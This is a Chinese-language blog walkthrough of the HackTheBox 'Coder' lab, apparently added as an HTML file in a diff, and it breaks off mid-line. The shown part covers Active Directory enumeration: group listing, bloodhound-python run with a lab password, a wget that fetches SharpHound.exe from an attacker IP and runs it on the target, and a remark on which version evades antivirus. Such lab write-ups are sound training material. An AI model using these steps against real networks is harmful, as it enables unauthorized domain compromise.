@@ -1,0 +1,767 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.lug.ustc.edu.cn/css?family=Noto+Serif+SC:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="简述本文是insane难度的HTB Coder机器的域渗透部分，其中Bloodhound AD Enumeration, ADCS CVE-2022-26923等域渗透提权细节是此box的特色，主要参考0xdf’s blog coder walkthrough和HTB的coder官方writeup paper记录这篇博客加深记忆和理解，及供后续做深入研究查阅，备忘。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox Coder [Bloodhound AD Enumeration + ADCS CVE-2022-26923]">
+<meta property="og:url" content="https://fdlucifer.github.io/2023/12/19/coder/index.html">
+<meta property="og:site_name" content="fdvoid0&#39;s blog">
+<meta property="og:description" content="简述本文是insane难度的HTB Coder机器的域渗透部分，其中Bloodhound AD Enumeration, ADCS CVE-2022-26923等域渗透提权细节是此box的特色，主要参考0xdf’s blog coder walkthrough和HTB的coder官方writeup paper记录这篇博客加深记忆和理解，及供后续做深入研究查阅，备忘。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Coder.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Coder1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Coder3.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Coder2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Coder4.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Coder5.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Coder6.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Coder7.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Coder8.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Coder9.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Coder10.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Coder11.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Coder12.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Coder13.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Coder14.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Coder15.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Coder16.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Coder17.png">
+<meta property="article:published_time" content="2023-12-19T09:02:57.000Z">
+<meta property="article:modified_time" content="2023-12-20T21:21:26.378Z">
+<meta property="article:author" content="fdvoid0">
+<meta property="article:tag" content="DC">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Coder.png">
+
+
+<link rel="canonical" href="https://fdlucifer.github.io/2023/12/19/coder/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2023/12/19/coder/","path":"2023/12/19/coder/","title":"HackTheBox Coder [Bloodhound AD Enumeration + ADCS CVE-2022-26923]"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>HackTheBox Coder [Bloodhound AD Enumeration + ADCS CVE-2022-26923] | fdvoid0's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="fdvoid0's blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">fdvoid0's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">by fdvoid0</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">43</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">51</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">211</span></a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AE%80%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">简述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%9B%B4%E6%8E%A5%E6%9D%A5%E5%88%B0%E6%8F%90%E6%9D%83%E9%83%A8%E5%88%86"><span class="nav-number">2.</span> <span class="nav-text">直接来到提权部分</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#bloodhound%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.1.</span> <span class="nav-text">bloodhound信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bloodhound%E5%88%86%E6%9E%90%E6%94%BB%E5%87%BB%E8%B7%AF%E5%BE%84"><span class="nav-number">2.2.</span> <span class="nav-text">bloodhound分析攻击路径</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit-Intended-CVE-2022-26923"><span class="nav-number">2.3.</span> <span class="nav-text">Exploit - Intended (CVE-2022-26923)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit-Shortcut"><span class="nav-number">2.4.</span> <span class="nav-text">Exploit - Shortcut</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WinRM-administrator-shell"><span class="nav-number">2.5.</span> <span class="nav-text">WinRM administrator shell</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reference-Sources"><span class="nav-number">3.</span> <span class="nav-text">Reference Sources</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="fdvoid0"
+      src="/images/blackhole.png">
+  <p class="site-author-name" itemprop="name">fdvoid0</p>
+  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">211</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">51</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">43</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vQGZkdm9pZDA=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;@fdvoid0"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="fa fa-stack-exchange fa-fw"></i>infosec.exchange</span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2023/12/19/coder/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/blackhole.png">
+      <meta itemprop="name" content="fdvoid0">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="fdvoid0's blog">
+      <meta itemprop="description" content="All things about infosec & ctf">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="HackTheBox Coder [Bloodhound AD Enumeration + ADCS CVE-2022-26923] | fdvoid0's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HackTheBox Coder [Bloodhound AD Enumeration + ADCS CVE-2022-26923]
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2023-12-19 17:02:57" itemprop="dateCreated datePublished" datetime="2023-12-19T17:02:57+08:00">2023-12-19</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2023-12-21 05:21:26" itemprop="dateModified" datetime="2023-12-21T05:21:26+08:00">2023-12-21</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Bloodhound-AD-Enumeration/" itemprop="url" rel="index"><span itemprop="name">Bloodhound AD Enumeration</span></a>
+        </span>
+          , 
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Bloodhound-AD-Enumeration/ADCS-CVE-2022-26923/" itemprop="url" rel="index"><span itemprop="name">ADCS CVE-2022-26923</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">Views: </span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="Word count in article">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">Word count in article: </span>
+      <span>4.3k</span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>16 mins.</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h1><p>本文是insane难度的HTB Coder机器的域渗透部分，其中Bloodhound AD Enumeration, ADCS CVE-2022-26923等域渗透提权细节是此box的特色，主要参考<span class="exturl" data-url="aHR0cHM6Ly8weGRmLmdpdGxhYi5pby8yMDIzLzEyLzE2L2h0Yi1jb2Rlci5odG1s">0xdf’s blog coder walkthrough<i class="fa fa-external-link-alt"></i></span>和<span class="exturl" data-url="aHR0cHM6Ly9hcHAuaGFja3RoZWJveC5jb20vbWFjaGluZXMvQ29kZXIvd3JpdGV1cHM=">HTB的coder官方writeup paper<i class="fa fa-external-link-alt"></i></span>记录这篇博客加深记忆和理解，及供后续做深入研究查阅，备忘。</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Coder.png"></li>
+</ul>
+<span id="more"></span>
+
+<h1 id="直接来到提权部分"><a href="#直接来到提权部分" class="headerlink" title="直接来到提权部分"></a>直接来到提权部分</h1><p>通过列出e.black用户所属的组来开始枚举。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\e.black\Documents&gt; <span class="built_in">whoami</span> /groups</span><br><span class="line"></span><br><span class="line">GROUP INFORMATION</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">Group Name                                  Type             SID                                            Attributes</span><br><span class="line">=========================================== ================ ============================================== ==================================================</span><br><span class="line">Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574                                   Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group</span><br><span class="line">CODER\PKI Admins                            Group            S-1-5-21-2608251805-3526430372-1546376444-2101 Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group</span><br><span class="line">Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\e.black\Documents&gt; net group <span class="string">&quot;PKI Admins&quot;</span></span><br><span class="line">Group name     PKI Admins</span><br><span class="line">Comment        ADCS Certificate and Template Management</span><br><span class="line"></span><br><span class="line">Members</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">e.black</span><br><span class="line">The <span class="built_in">command</span> completed successfully.</span><br></pre></td></tr></table></figure>
+
+<p>列出了几个组，其中最值得注意的是PKI Admins，继续枚举它们。</p>
+<p>该组织控制着Active Directory Certificate Services (ADCS) 证书，为潜在的ADCS滥用打开了大门。从这里开始，可以继续手动枚举系统，或者尝试使用混淆版本的SharpHound来做大部分的枚举。</p>
+<h2 id="bloodhound信息收集"><a href="#bloodhound信息收集" class="headerlink" title="bloodhound信息收集"></a>bloodhound信息收集</h2><p>通过之前渗透得到的账号密码信息继续使用bloodhound-python进行信息收集</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">~/hackthebox/machine/coder ⌚ 18:44:17</span><br><span class="line">$ bloodhound-python -c All -u e.black -p ypOSJXPqlDOxxbQSfEERy300 -ns 10.10.11.207 -d coder.htb -dc coder.htb --zip</span><br><span class="line">INFO: Found AD domain: coder.htb</span><br><span class="line">INFO: Getting TGT <span class="keyword">for</span> user</span><br><span class="line">INFO: Connecting to LDAP server: coder.htb</span><br><span class="line">INFO: Kerberos auth to LDAP failed, trying NTLM</span><br><span class="line">WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...</span><br><span class="line">INFO: Kerberos auth to LDAP failed, trying NTLM</span><br><span class="line">INFO: Found 1 domains</span><br><span class="line">INFO: Found 1 domains <span class="keyword">in</span> the forest</span><br><span class="line">INFO: Found 1 computers</span><br><span class="line">INFO: Connecting to LDAP server: coder.htb</span><br><span class="line">INFO: Kerberos auth to LDAP failed, trying NTLM</span><br><span class="line">WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...</span><br><span class="line">INFO: Kerberos auth to LDAP failed, trying NTLM</span><br><span class="line">INFO: Found 10 <span class="built_in">users</span></span><br><span class="line">INFO: Found 55 <span class="built_in">groups</span></span><br><span class="line">INFO: Found 3 gpos</span><br><span class="line">INFO: Found 5 ous</span><br><span class="line">INFO: Found 19 containers</span><br><span class="line">INFO: Found 0 trusts</span><br><span class="line">INFO: Starting computer enumeration with 10 workers</span><br><span class="line">INFO: Querying computer: dc01.coder.htb</span><br><span class="line">INFO: Done <span class="keyword">in</span> 02M 23S</span><br><span class="line">INFO: Compressing output into 20231220185002_bloodhound.zip</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Coder1.png"></li>
+</ul>
+<p>或<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0Jsb29kSG91bmRBRC9TaGFycEhvdW5kL3JlbGVhc2VzL2Rvd25sb2FkL3YxLjEuMS9TaGFycEhvdW5kLXYxLjEuMS56aXA=">SharpHound v1.1.1<i class="fa fa-external-link-alt"></i></span></p>
+<ul>
+<li>注意这里<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0Jsb29kSG91bmRBRC9TaGFycEhvdW5kL3JlbGVhc2VzL2Rvd25sb2FkL3YyLjMuMC9TaGFycEhvdW5kLXYyLjMuMC56aXA=">SharpHound最新版2.3.0<i class="fa fa-external-link-alt"></i></span>收集到的zip文件，最新版<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0Jsb29kSG91bmRBRC9CbG9vZEhvdW5kL3JlbGVhc2VzL2Rvd25sb2FkL3Y0LjMuMS9CbG9vZEhvdW5kLXdpbjMyLXg2NC56aXA=">bloodhound 4.3.1<i class="fa fa-external-link-alt"></i></span>解析不了，多次尝试发现只有<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0Jsb29kSG91bmRBRC9TaGFycEhvdW5kL3JlbGVhc2VzL2Rvd25sb2FkL3YxLjEuMS9TaGFycEhvdW5kLXYxLjEuMS56aXA=">SharpHound v1.1.1<i class="fa fa-external-link-alt"></i></span>版本不会被杀软kill，而且可以正常收集zip文件，最新版<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0Jsb29kSG91bmRBRC9CbG9vZEhvdW5kL3JlbGVhc2VzL2Rvd25sb2FkL3Y0LjMuMS9CbG9vZEhvdW5kLXdpbjMyLXg2NC56aXA=">bloodhound 4.3.1<i class="fa fa-external-link-alt"></i></span>也能正常解析</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\e.black\Documents&gt; wget 10.10.16.55/SharpHound.exe -o SharpHound.exe</span><br><span class="line">*Evil-WinRM* PS C:\Users\e.black\Documents&gt; ./SharpHound.exe -c ALL</span><br><span class="line">2023-12-20T16:27:11.3045690-08:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound</span><br><span class="line">2023-12-20T16:27:11.5155041-08:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote</span><br><span class="line">2023-12-20T16:27:11.5436318-08:00|INFORMATION|Initializing SharpHound at 4:27 PM on 12/20/2023</span><br><span class="line">2023-12-20T16:27:11.6842528-08:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller <span class="keyword">for</span> coder.htb : dc01.coder.htb</span><br><span class="line">2023-12-20T16:27:11.9936243-08:00|INFORMATION|Loaded cache with stats: 286 ID to <span class="built_in">type</span> mappings.</span><br><span class="line"> 287 name to SID mappings.</span><br><span class="line"> 1 machine sid mappings.</span><br><span class="line"> 2 sid to domain mappings.</span><br><span class="line"> 0 global catalog mappings.</span><br><span class="line">2023-12-20T16:27:12.0076864-08:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote</span><br><span class="line">2023-12-20T16:27:12.1905057-08:00|INFORMATION|Beginning LDAP search <span class="keyword">for</span> coder.htb</span><br><span 